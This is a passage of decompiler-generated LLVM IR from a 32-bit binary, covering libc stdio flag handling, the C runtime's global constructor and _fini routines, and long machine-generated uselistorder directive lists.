  %v3_80589db = icmp eq i32 %v2_80589db, 0
  %v1_80589dd = icmp eq i1 %v3_80589db, false
  br i1 %v1_80589dd, label %dec_label_pc_80589eb, label %dec_label_pc_80589df

dec_label_pc_80589df:                             ; preds = %entry
  %v1_80589df = and i32 %v3_80589d8, 2176
  %v2_80589df = icmp eq i32 %v1_80589df, 0
  %v1_80589e4 = icmp eq i1 %v2_80589df, false
  br i1 %v1_80589e4, label %dec_label_pc_80589f2, label %dec_label_pc_80589e6

dec_label_pc_80589e6:                             ; preds = %dec_label_pc_80589df
  %v2_80589e6 = or i32 %v3_80589d8, %arg2
  %v1_80589e8 = trunc i32 %v2_80589e6 to i16
  store i16 %v1_80589e8, i16* %arg1, align 2
  %v0_80589eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80589eb

dec_label_pc_80589eb:                             ; preds = %entry, %dec_label_pc_80589e6
  %v0_8058a11 = phi i32 [ %v4_80589d0, %entry ], [ %v0_80589eb.pre, %dec_label_pc_80589e6 ]
  %v1_80589eb = inttoptr i32 %v0_8058a11 to i16*
  %v2_80589eb = load i16, i16* %v1_80589eb, align 2
  %v2_80589ee = and i16 %v2_80589eb, 16
  %v3_80589ee = icmp eq i16 %v2_80589ee, 0
  br i1 %v3_80589ee, label %dec_label_pc_8058a0a, label %dec_label_pc_80589f2

dec_label_pc_80589f2:                             ; preds = %dec_label_pc_80589eb, %dec_label_pc_80589df
  %v1_80589f2 = call i32 @__errno_location(i32 %v0_80589cc)
  %v1_80589f7 = inttoptr i32 %v1_80589f2 to i32*
  store i32 9, i32* %v1_80589f7, align 4
  br label %dec_label_pc_80589fd

dec_label_pc_80589fd:                             ; preds = %dec_label_pc_8058a0e, %dec_label_pc_80589f2
  %v0_80589fd = load i32, i32* @ebx, align 4
  %v1_80589fd = inttoptr i32 %v0_80589fd to i32*
  %v2_80589fd = load i32, i32* %v1_80589fd, align 4
  %v1_80589ff = or i32 %v2_80589fd, 8
  %v1_8058a02 = trunc i32 %v1_80589ff to i16
  %v3_8058a02 = inttoptr i32 %v0_80589fd to i16*
  store i16 %v1_8058a02, i16* %v3_8058a02, align 2
  br label %dec_label_pc_8058a36

dec_label_pc_8058a0a:                             ; preds = %dec_label_pc_80589eb
  %v2_8058a0a = and i16 %v2_80589eb, 64
  %v3_8058a0a = icmp eq i16 %v2_8058a0a, 0
  br i1 %v3_8058a0a, label %dec_label_pc_8058a2c, label %dec_label_pc_8058a0e

dec_label_pc_8058a0e:                             ; preds = %dec_label_pc_8058a0a
  %v2_8058a12 = call i32 @__stdio_wcommit(i32 %v0_8058a11)
  %v1_8058a1a = icmp eq i32 %v2_8058a12, 0
  %v1_8058a1c = icmp eq i1 %v1_8058a1a, false
  br i1 %v1_8058a1c, label %dec_label_pc_80589fd, label %dec_label_pc_8058a1e

dec_label_pc_8058a1e:                             ; preds = %dec_label_pc_8058a0e
  %v0_8058a1e = load i32, i32* @ebx, align 4
  %v1_8058a1e = add i32 %v0_8058a1e, 8
  %v2_8058a1e = inttoptr i32 %v1_8058a1e to i32*
  %v3_8058a1e = load i32, i32* %v2_8058a1e, align 4
  %v2_8058a21 = add i32 %v0_8058a1e, 28
  %v3_8058a21 = inttoptr i32 %v2_8058a21 to i32*
  store i32 %v3_8058a1e, i32* %v3_8058a21, align 4
  %v0_8058a24 = load i32, i32* @ebx, align 4
  %v1_8058a24 = inttoptr i32 %v0_8058a24 to i32*
  %v2_8058a24 = load i32, i32* %v1_8058a24, align 4
  %v2_8058a24.tr = trunc i32 %v2_8058a24 to i16
  %v1_8058a29 = and i16 %v2_8058a24.tr, -65
  %v3_8058a29 = inttoptr i32 %v0_8058a24 to i16*
  store i16 %v1_8058a29, i16* %v3_8058a29, align 2
  %v0_8058a2c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058a2c

dec_label_pc_8058a2c:                             ; preds = %dec_label_pc_8058a0a, %dec_label_pc_8058a1e
  %v2_8058a31 = phi i32 [ %v0_8058a11, %dec_label_pc_8058a0a ], [ %v0_8058a2c.pre, %dec_label_pc_8058a1e ]
  %v1_8058a2c = inttoptr i32 %v2_8058a31 to i32*
  %v2_8058a2c = load i32, i32* %v1_8058a2c, align 4
  %v1_8058a2e = or i32 %v2_8058a2c, 1
  %v1_8058a31 = trunc i32 %v1_8058a2e to i16
  %v3_8058a31 = inttoptr i32 %v2_8058a31 to i16*
  store i16 %v1_8058a31, i16* %v3_8058a31, align 2
  br label %dec_label_pc_8058a36

dec_label_pc_8058a36:                             ; preds = %dec_label_pc_80589fd, %dec_label_pc_8058a2c
  %storemerge = phi i32 [ 0, %dec_label_pc_8058a2c ], [ -1, %dec_label_pc_80589fd ]
  %v2_8058a36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058a36, i32* @edx, align 4
  store i32 %v0_80589cc, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_80589d8, { 0, 2, 1 }
  uselistorder i32 %v0_80589cc, { 1, 0 }
  uselistorder i32* @edx, { 295, 4, 296, 297, 298, 299, 300, 301, 302, 303, 5, 304, 305, 306, 307, 308, 309, 16, 312, 310, 311, 313, 314, 315, 316, 317, 318, 319, 24, 28, 25, 26, 27, 320, 321, 322, 323, 324, 325, 326, 333, 327, 328, 329, 330, 331, 332, 1, 17, 62, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 351, 348, 349, 350, 352, 353, 354, 355, 405, 6, 2, 18, 63, 356, 357, 358, 359, 360, 361, 362, 363, 473, 474, 475, 476, 7, 477, 478, 396, 410, 72, 411, 29, 480, 30, 481, 412, 483, 484, 491, 490, 73, 36, 74, 75, 76, 77, 78, 79, 31, 415, 416, 8, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 9, 430, 431, 413, 414, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 10, 457, 458, 459, 460, 461, 486, 80, 397, 398, 400, 401, 402, 0, 399, 404, 364, 365, 366, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 15, 384, 385, 367, 386, 11, 387, 388, 390, 12, 391, 392, 393, 394, 395, 23, 13, 389, 482, 14, 81, 406, 407, 479, 82, 485, 403, 487, 472, 408, 409, 292, 32, 488, 489, 33, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 65, 66, 67, 68, 69, 70, 71, 19, 20, 21, 22, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 293, 294, 462, 463, 464, 465, 467, 471, 466, 469, 470, 3, 468, 492 }
  uselistorder i32 28, { 22, 23, 24, 17, 18, 25, 26, 27, 28, 45, 36, 29, 30, 0, 31, 32, 33, 34, 35, 4, 5, 6, 2, 37, 16, 38, 39, 40, 41, 42, 43, 3, 44, 46, 19, 20, 7, 8, 21, 13, 12, 10, 11, 14, 15, 9, 1 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 8, { 116, 117, 118, 119, 120, 121, 123, 122, 124, 0, 1, 125, 126, 127, 128, 129, 130, 8, 131, 2, 17, 132, 133, 134, 135, 136, 137, 35, 138, 139, 38, 21, 22, 23, 24, 39, 25, 26, 40, 41, 27, 42, 28, 43, 44, 140, 141, 142, 143, 144, 145, 37, 36, 146, 147, 148, 149, 217, 218, 219, 32, 225, 33, 226, 34, 49, 29, 70, 110, 115, 71, 72, 171, 172, 173, 174, 175, 176, 177, 9, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 10, 188, 189, 190, 191, 192, 46, 11, 47, 12, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 45, 210, 211, 13, 212, 213, 214, 215, 14, 216, 169, 170, 3, 224, 150, 4, 5, 50, 151, 152, 153, 154, 156, 157, 158, 155, 159, 160, 161, 162, 30, 31, 163, 164, 165, 166, 167, 168, 220, 221, 222, 223, 6, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 48, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 19, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 20, 103, 104, 105, 106, 107, 108, 109, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 18, 111, 112, 113, 114, 7, 16, 15 }
  uselistorder i32 9, { 10, 11, 12, 13, 14, 4, 15, 16, 3, 8, 5, 17, 18, 19, 20, 6, 7, 1, 9, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 48, 47, 46, 71, 70, 69, 45, 44, 43, 42, 41, 40, 25, 39, 38, 37, 18, 55, 24, 13, 12, 11, 10, 68, 9, 23, 22, 8, 21, 54, 53, 60, 59, 67, 66, 65, 20, 19, 52, 17, 33, 36, 35, 34, 0, 14, 51, 7, 6, 64, 32, 31, 63, 29, 5, 16, 1, 28, 15, 2, 50, 27, 26, 62, 61, 4, 3, 58, 57, 56, 72, 49, 30 }
  uselistorder i16 0, { 0, 8, 6, 9, 2, 1, 10, 7, 11, 13, 14, 15, 16, 12, 17, 18, 3, 4, 5 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8058a36, { 1, 0 }
  uselistorder label %dec_label_pc_8058a2c, { 1, 0 }
  uselistorder label %dec_label_pc_80589eb, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8058a4c = load i32, i32* @global_var_805f000.994, align 4096
  %v10_8058a51 = icmp eq i32 %v0_8058a4c, -1
  br i1 %v10_8058a51, label %dec_label_pc_8058a6c, label %dec_label_pc_8058a60.preheader

dec_label_pc_8058a60.preheader:                   ; preds = %entry
  br label %dec_label_pc_8058a60

dec_label_pc_8058a60:                             ; preds = %dec_label_pc_8058a60.preheader, %dec_label_pc_8058a60
  %v4_8058a63 = phi i32 [ %v0_8058a4c, %dec_label_pc_8058a60.preheader ], [ %v2_8058a65, %dec_label_pc_8058a60 ]
  %v0_8058a60 = phi i32 [ ptrtoint (i32* @global_var_805f000.994 to i32), %dec_label_pc_8058a60.preheader ], [ %v1_8058a60, %dec_label_pc_8058a60 ]
  %v1_8058a60 = add i32 %v0_8058a60, -4
  call void @__pseudo_call(i32 %v4_8058a63)
  %v1_8058a65 = inttoptr i32 %v1_8058a60 to i32*
  %v2_8058a65 = load i32, i32* %v1_8058a65, align 4
  %v10_8058a67 = icmp eq i32 %v2_8058a65, -1
  %v1_8058a6a = icmp eq i1 %v10_8058a67, false
  br i1 %v1_8058a6a, label %dec_label_pc_8058a60, label %dec_label_pc_8058a6c.loopexit

dec_label_pc_8058a6c.loopexit:                    ; preds = %dec_label_pc_8058a60
  %v2_8058a6c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8058a6c

dec_label_pc_8058a6c:                             ; preds = %dec_label_pc_8058a6c.loopexit, %entry
  %v2_8058a6c = phi i32 [ %v2_8058a6c.pre, %dec_label_pc_8058a6c.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8058a6c

; uselistorder directives
  uselistorder i32 %v0_8058a4c, { 1, 0 }
  uselistorder i1 false, { 937, 640, 641, 642, 643, 38, 644, 645, 5, 3, 4, 7, 646, 647, 649, 648, 6, 651, 650, 652, 653, 654, 655, 663, 39, 40, 658, 662, 660, 661, 65, 656, 657, 659, 664, 665, 666, 667, 668, 154, 156, 157, 158, 159, 155, 160, 161, 164, 59, 162, 60, 163, 669, 670, 675, 41, 671, 672, 674, 673, 676, 677, 682, 681, 678, 679, 680, 8, 0, 9, 338, 339, 340, 66, 683, 684, 685, 688, 686, 687, 10, 42, 689, 691, 690, 67, 692, 694, 693, 68, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 883, 715, 43, 11, 710, 711, 712, 713, 714, 716, 717, 44, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 865, 866, 868, 867, 12, 341, 342, 343, 344, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 98, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 938, 939, 61, 2, 768, 69, 100, 769, 770, 884, 885, 886, 165, 955, 956, 957, 958, 961, 70, 962, 963, 960, 954, 940, 132, 398, 399, 400, 401, 402, 403, 941, 942, 101, 189, 190, 191, 192, 193, 194, 13, 404, 405, 62, 408, 14, 417, 418, 166, 945, 946, 947, 948, 949, 952, 953, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 887, 900, 901, 902, 903, 904, 905, 906, 907, 908, 36, 910, 909, 914, 911, 912, 913, 15, 915, 916, 406, 407, 873, 840, 841, 843, 844, 845, 959, 17, 411, 410, 16, 771, 772, 71, 853, 854, 855, 857, 856, 18, 858, 773, 19, 842, 859, 860, 774, 99, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 795, 794, 796, 797, 798, 799, 800, 802, 37, 803, 801, 804, 806, 805, 20, 807, 808, 810, 809, 72, 811, 812, 813, 814, 815, 102, 816, 817, 110, 111, 818, 112, 113, 819, 820, 114, 821, 822, 103, 115, 823, 824, 825, 826, 827, 104, 828, 105, 116, 106, 829, 107, 830, 831, 832, 108, 833, 109, 834, 117, 835, 836, 837, 151, 152, 838, 839, 943, 73, 944, 21, 950, 951, 876, 180, 169, 167, 168, 74, 170, 22, 171, 172, 173, 23, 174, 175, 176, 177, 178, 179, 181, 182, 184, 183, 24, 185, 186, 187, 188, 195, 196, 197, 198, 199, 200, 201, 202, 205, 118, 203, 204, 89, 90, 206, 97, 45, 207, 208, 209, 96, 210, 211, 212, 213, 214, 215, 218, 119, 216, 217, 87, 88, 219, 46, 220, 221, 222, 223, 224, 225, 226, 229, 120, 227, 228, 85, 86, 230, 47, 231, 232, 233, 234, 235, 236, 237, 240, 121, 238, 239, 83, 84, 241, 48, 242, 243, 244, 245, 246, 247, 248, 251, 122, 249, 250, 81, 82, 252, 253, 254, 255, 256, 257, 260, 123, 258, 259, 79, 80, 261, 49, 262, 263, 264, 265, 266, 267, 268, 269, 270, 273, 124, 271, 272, 77, 78, 274, 50, 275, 276, 277, 278, 279, 280, 281, 284, 125, 282, 283, 75, 76, 285, 51, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 126, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 345, 127, 366, 128, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 91, 92, 367, 368, 369, 370, 371, 372, 373, 374, 375, 1, 376, 129, 377, 378, 379, 130, 380, 381, 131, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 409, 412, 52, 413, 414, 415, 26, 416, 25, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 53, 626, 627, 628, 629, 630, 64, 631, 632, 633, 634, 635, 636, 637, 638, 639, 846, 847, 95, 848, 54, 849, 55, 850, 852, 851, 27, 863, 861, 862, 28, 864, 29, 869, 870, 871, 30, 872, 63, 874, 875, 877, 878, 879, 56, 880, 881, 882, 917, 933, 918, 919, 920, 921, 926, 930, 931, 932, 31, 922, 93, 923, 924, 925, 57, 35, 927, 34, 58, 33, 928, 929, 32, 934, 935, 936, 153, 94, 964, 965 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 3, 38, 19, 32, 33, 34, 35, 43, 44, 45, 46, 4, 47, 1, 42, 48, 49, 50, 51, 52, 53, 5, 41, 39, 40, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 2, 36, 6, 0, 37 }
  uselistorder i32 ptrtoint (i32* @global_var_805f000.994 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 187, 80, 70, 188, 201, 81, 202, 82, 203, 336, 83, 84, 204, 85, 2, 3, 183, 331, 205, 4, 5, 6, 88, 87, 86, 206, 144, 145, 65, 64, 63, 207, 208, 89, 209, 54, 337, 210, 338, 339, 211, 212, 340, 213, 66, 214, 215, 216, 90, 217, 341, 218, 219, 220, 91, 189, 342, 343, 92, 221, 222, 223, 344, 345, 8, 9, 346, 347, 170, 224, 171, 172, 162, 164, 165, 166, 167, 168, 169, 163, 55, 161, 152, 158, 225, 159, 160, 173, 174, 157, 175, 176, 177, 178, 179, 180, 181, 153, 156, 7, 227, 226, 78, 56, 228, 229, 348, 349, 10, 62, 74, 230, 350, 231, 154, 93, 94, 232, 95, 233, 190, 234, 235, 75, 236, 182, 237, 69, 238, 239, 240, 97, 96, 241, 242, 71, 243, 98, 99, 100, 244, 101, 102, 245, 103, 246, 104, 247, 105, 248, 106, 249, 107, 250, 108, 251, 109, 252, 110, 253, 11, 12, 13, 254, 79, 111, 112, 255, 256, 257, 258, 259, 260, 114, 113, 191, 115, 14, 116, 261, 117, 262, 67, 263, 118, 264, 265, 367, 266, 267, 15, 364, 365, 18, 17, 19, 20, 21, 119, 22, 120, 23, 268, 16, 366, 57, 269, 270, 271, 192, 272, 24, 25, 355, 358, 121, 359, 351, 360, 273, 274, 275, 356, 357, 276, 361, 362, 277, 363, 368, 122, 72, 278, 60, 352, 353, 61, 279, 280, 354, 281, 123, 282, 283, 284, 199, 200, 285, 286, 58, 155, 124, 287, 125, 288, 76, 77, 289, 126, 290, 127, 291, 128, 292, 129, 293, 130, 294, 131, 295, 132, 296, 133, 297, 134, 298, 135, 299, 136, 300, 137, 301, 138, 302, 139, 303, 140, 304, 141, 305, 142, 306, 143, 307, 26, 308, 193, 309, 310, 332, 333, 27, 28, 29, 30, 31, 32, 311, 33, 312, 34, 313, 35, 314, 36, 315, 37, 316, 38, 317, 39, 40, 42, 41, 43, 318, 44, 45, 73, 46, 47, 68, 59, 48, 49, 194, 335, 334, 319, 195, 320, 321, 322, 323, 50, 324, 185, 186, 184, 51, 146, 147, 148, 149, 150, 151, 52, 325, 326, 327, 328, 329, 330, 53, 196, 197, 198 }
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_8058a60, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8058a77 = load i32, i32* @ebx, align 4
  %v1_8058a78 = call i32 @__get_pc_thunk_bx(i32 %v0_8058a77)
  store i32 %v1_8058a78, i32* @eax, align 4
  %v0_8058a83 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8058a83

; uselistorder directives
  uselistorder i32* @eax, { 13, 105, 30, 107, 0, 3, 108, 109, 2, 110, 1, 29, 106, 111, 31, 112, 57, 58, 60, 14, 59, 113, 118, 114, 115, 116, 117, 4, 5, 119, 120, 121, 32, 122, 123, 124, 125, 126, 127, 128, 129, 130, 33, 131, 132, 133, 134, 135, 34, 35, 136, 137, 138, 139, 36, 140, 183, 141, 39, 37, 142, 38, 143, 144, 145, 146, 40, 41, 147, 148, 42, 149, 43, 150, 44, 45, 46, 151, 152, 153, 154, 47, 155, 156, 157, 158, 48, 171, 185, 186, 53, 187, 188, 190, 54, 191, 6, 189, 11, 12, 184, 94, 15, 61, 62, 100, 63, 172, 174, 175, 173, 176, 177, 179, 180, 178, 168, 52, 7, 8, 159, 161, 160, 162, 163, 165, 56, 164, 166, 167, 16, 64, 65, 66, 17, 67, 18, 19, 68, 69, 70, 71, 49, 72, 50, 73, 51, 74, 20, 75, 21, 76, 22, 77, 23, 78, 24, 79, 80, 25, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 26, 91, 27, 92, 93, 28, 55, 95, 96, 97, 98, 99, 101, 102, 103, 104, 169, 170, 192, 181, 182, 9, 10 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 340, 2115, 2116, 2117, 1793, 2118, 2119, 1794, 2120, 23, 24, 25, 127, 82, 1795, 2121, 2124, 2122, 2123, 1796, 2125, 0, 2126, 2127, 2128, 341, 2129, 2130, 2131, 296, 2141, 2134, 2135, 2136, 28, 73, 2137, 2138, 2139, 1797, 2140, 139, 140, 141, 2132, 2133, 147, 2142, 2143, 2145, 2146, 2144, 2147, 261, 2148, 2149, 2150, 2151, 2152, 2153, 149, 150, 1798, 342, 343, 1912, 1799, 1913, 148, 1914, 1915, 1916, 1917, 1918, 1919, 85, 86, 1920, 1921, 1922, 1762, 1923, 84, 1800, 83, 1801, 151, 152, 1802, 26, 1803, 1924, 27, 1804, 153, 344, 1805, 1806, 154, 1807, 2156, 1808, 2154, 246, 2155, 345, 346, 155, 156, 74, 1809, 2157, 2158, 2159, 2160, 2161, 347, 1810, 1811, 157, 2162, 29, 87, 2031, 122, 123, 1812, 2163, 88, 1813, 30, 158, 2164, 89, 1814, 2165, 1815, 2167, 2166, 224, 1816, 1817, 2168, 2170, 2169, 225, 1818, 2171, 1819, 2172, 1820, 2173, 2174, 2175, 2176, 2177, 2178, 2179, 2180, 2181, 2182, 262, 2183, 159, 1821, 1822, 2184, 2185, 2186, 18, 263, 161, 160, 2187, 2188, 264, 2189, 2190, 1823, 2191, 2192, 2193, 2194, 162, 2195, 1824, 2196, 2197, 163, 1825, 164, 348, 2202, 2198, 2199, 2200, 2201, 130, 31, 2203, 2204, 2205, 2206, 2207, 2208, 2214, 2215, 2216, 2217, 2209, 2210, 2211, 2212, 2213, 90, 91, 1826, 2218, 2219, 165, 1827, 2220, 2221, 2222, 2223, 2224, 2225, 2226, 2227, 2228, 2229, 2230, 2231, 2232, 2233, 2234, 2235, 2236, 2237, 166, 2467, 2468, 167, 2469, 2470, 2471, 92, 131, 265, 142, 1828, 132, 2238, 168, 2239, 32, 133, 124, 2240, 226, 169, 2241, 1, 2242, 1829, 2243, 349, 2244, 2245, 2246, 2247, 2248, 2249, 2250, 170, 1830, 2251, 2252, 2253, 2254, 171, 2255, 1831, 219, 350, 172, 1832, 1833, 1834, 173, 2256, 266, 2257, 2258, 2259, 2260, 267, 328, 329, 2261, 2262, 2263, 2264, 2265, 2266, 1835, 268, 2267, 125, 1836, 2268, 174, 269, 270, 2269, 2270, 1837, 2271, 2272, 2273, 2274, 118, 2542, 2543, 2544, 2545, 2546, 2547, 2548, 2549, 2, 227, 2275, 134, 2276, 228, 1838, 1839, 2277, 175, 2278, 2479, 2494, 2495, 2496, 351, 2497, 2060, 2498, 2551, 1925, 2552, 2553, 2554, 1926, 2555, 2499, 2500, 2556, 176, 2557, 2568, 2569, 33, 1840, 3, 146, 1841, 1842, 2582, 2586, 229, 2587, 177, 1741, 352, 353, 4, 2558, 2559, 2560, 178, 1880, 1761, 179, 1843, 2061, 5, 271, 272, 180, 2062, 2063, 181, 182, 2065, 2064, 2066, 2067, 354, 1742, 2068, 2070, 2069, 2071, 2561, 2562, 183, 1844, 2567, 1951, 1952, 1953, 1954, 1845, 1846, 1955, 1956, 1957, 273, 184, 185, 186, 355, 356, 126, 357, 2073, 2072, 358, 2080, 187, 188, 1847, 1927, 1848, 1928, 189, 1849, 190, 1850, 2082, 93, 2083, 2084, 2085, 2086, 2087, 6, 1851, 2102, 1852, 1929, 1930, 1931, 1932, 1853, 191, 2570, 1743, 192, 274, 2574, 2577, 2576, 2503, 275, 2504, 2505, 2506, 2507, 276, 2508, 2509, 2510, 359, 2501, 360, 2502, 361, 1854, 1855, 362, 1744, 1856, 363, 1745, 193, 1857, 2511, 2512, 194, 195, 364, 1746, 144, 76, 77, 2513, 2514, 2515, 2516, 2517, 2518, 196, 197, 365, 1747, 143, 2519, 230, 2520, 128, 2521, 2522, 2524, 1858, 2523, 7, 1933, 8, 2575, 2074, 2075, 2076, 2077, 2079, 2078, 9, 277, 2480, 2481, 2482, 2441, 1859, 278, 2442, 1860, 2443, 2444, 2445, 2447, 2448, 2449, 2450, 2451, 2452, 2453, 2454, 2472, 2455, 198, 199, 1861, 1862, 279, 2583, 2585, 34, 200, 2279, 2280, 366, 2281, 201, 1863, 2282, 231, 135, 2463, 2464, 2283, 94, 2446, 280, 281, 202, 2284, 2285, 2286, 2287, 2288, 2289, 2290, 2291, 2292, 2293, 2294, 2295, 2296, 2297, 2298, 203, 1864, 2299, 282, 2300, 2301, 2302, 2303, 2304, 35, 36, 1865, 247, 248, 2305, 2306, 2307, 2308, 204, 2309, 2310, 2311, 1866, 2312, 37, 38, 205, 1867, 2313, 2314, 2315, 2318, 2316, 2317, 39, 78, 95, 2319, 2320, 2321, 2322, 330, 2323, 2324, 206, 2325, 2326, 2327, 2328, 2329, 2330, 2331, 2332, 208, 2333, 2334, 2335, 1868, 2336, 2337, 232, 233, 2338, 2339, 2340, 209, 207, 2341, 210, 2342, 2343, 1869, 2344, 2345, 2346, 2347, 2348, 2349, 2350, 2352, 2353, 2354, 2355, 2356, 2357, 2358, 2359, 2360, 2361, 2362, 211, 1870, 1871, 212, 2363, 2364, 2365, 1872, 1873, 2366, 2367, 2368, 2369, 2370, 2371, 2372, 2373, 1874, 1875, 2374, 2375, 2376, 2377, 2378, 2379, 2380, 2381, 2382, 2383, 2384, 2385, 2386, 2387, 2388, 1876, 2389, 2390, 2391, 2392, 2393, 2394, 2395, 2396, 2397, 2398, 2399, 2400, 2401, 283, 1877, 284, 2402, 2403, 2404, 2405, 2406, 2407, 2408, 2409, 2410, 2411, 2412, 2413, 2414, 285, 2415, 2416, 2417, 2418, 2419, 2420, 2421, 40, 96, 97, 98, 99, 2422, 2423, 2424, 2425, 2426, 2427, 213, 2428, 1878, 2429, 2430, 2431, 2432, 1748, 2433, 2434, 2435, 2436, 2437, 2438, 214, 1879, 129, 75, 119, 2351, 234, 2439, 2440, 2563, 2564, 235, 2566, 2565, 100, 367, 2081, 2550, 215, 2088, 2571, 2572, 2573, 1934, 2458, 2478, 1935, 2485, 2578, 145, 286, 2540, 2584, 2486, 2541, 2581, 2487, 2110, 2488, 2489, 1936, 1945, 2579, 2580, 220, 371, 221, 372, 1937, 370, 101, 21, 22, 373, 1938, 374, 381, 382, 41, 287, 368, 1763, 1939, 216, 288, 369, 1940, 375, 1941, 376, 289, 1942, 377, 378, 379, 383, 384, 1943, 1944, 380, 386, 387, 385, 249, 250, 251, 103, 1947, 388, 1946, 391, 392, 102, 389, 393, 394, 390, 1948, 395, 1949, 331, 1950, 396, 136, 421, 1765, 426, 427, 290, 42, 43, 1958, 1764, 1766, 428, 429, 418, 1959, 1961, 419, 420, 1960, 243, 1962, 332, 1963, 1964, 1965, 1966, 1767, 430, 431, 415, 1967, 1969, 416, 417, 1968, 242, 1970, 1768, 432, 433, 412, 1971, 1973, 413, 414, 1972, 241, 